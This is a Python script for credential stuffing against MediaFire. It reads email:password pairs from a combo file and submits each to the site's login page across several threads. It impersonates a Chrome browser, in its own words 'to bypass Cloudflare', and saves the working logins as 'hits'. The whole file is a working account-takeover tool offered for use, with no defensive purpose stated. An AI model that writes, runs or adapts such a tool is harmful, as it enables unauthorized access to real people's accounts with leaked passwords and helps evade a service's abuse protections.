import asyncio
import os
from curl_cffi import requests
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# Configuration
COMBO_FILE = "mediafire_combo.txt"
RESULT_FILE = "mediafire_valid.txt"
THREADS = 5

# Console colors
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'

print_lock = Lock()

def log(status, email, valid=False):
    with print_lock:
        if valid:
            print(f"{Colors.GREEN}[HIT] {email}{Colors.RESET}")
            with open(RESULT_FILE, "a") as f:
                f.write(f"{email}\n")
        else:
            print(f"{Colors.RED}[FAIL] {email} - {status}{Colors.RESET}")

def check_account(line):
    if ":" not in line:
        return
    
    parts = line.strip().split(":", 1)
    email = parts[0]
    password = parts[1]

    url_login = "https://www.mediafire.com/login/"
    
    payload = {
        "login_email": email,
        "login_pass": password,
        "login_remember": "on"
    }

    try:
        # Using chrome110 impersonation to bypass Cloudflare
        # session = requests.Session(impersonate="chrome110")
        
        # 1. Initial hit (optional, usually good to get cookies)
        # session.get(url_login)

        # 2. Login POST
        response = requests.post(
            url_login, 
            data=payload, 
            impersonate="chrome110",
            timeout=20,
            allow_redirects=True
        )

        res_text = response.text

        # Analysis of response
        # Redirect to /myfiles indicates success
        if "/myfiles" in response.url or "response_code/OK" in res_text:
             # Check for "My Files" text or similar to be sure
             if "Logout" in res_text or "My Files" in res_text or "account_nav" in res_text:
                 log("Success", f"{email}:{password}", valid=True)
                 return

        # Failure cases
        if "login_error_msg" in res_text or "Invalid email or password" in res_text:
            log("Invalid Credentials", email)
        elif "Just a moment..." in res_text:
            log("Cloudflare Block", email)
        else:
             # Try to detect login by checking if headers changed or if we are on a dashboard
             log("Unknown Response", email)

    except Exception as e:
        log(f"Error: {str(e)}", email)

def main():
    if not os.path.exists(COMBO_FILE):
        print(f"File '{COMBO_FILE}' not found. Creating a dummy file.")
        with open(COMBO_FILE, "w") as f:
            f.write("test@example.com:password123\n")
            f.write("valid@email.com:correctpassword\n")
        print(f"Please populate '{COMBO_FILE}' with email:password lines.")
        return

    print(f"Starting MediaFire Checker with {THREADS} threads...")
    
    with open(COMBO_FILE, "r", encoding="utf-8", errors="ignore") as f:
        lines = [line.strip() for line in f if line.strip()]

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(check_account, lines)

    print("\nChecking complete.")

if __name__ == "__main__":
    main()
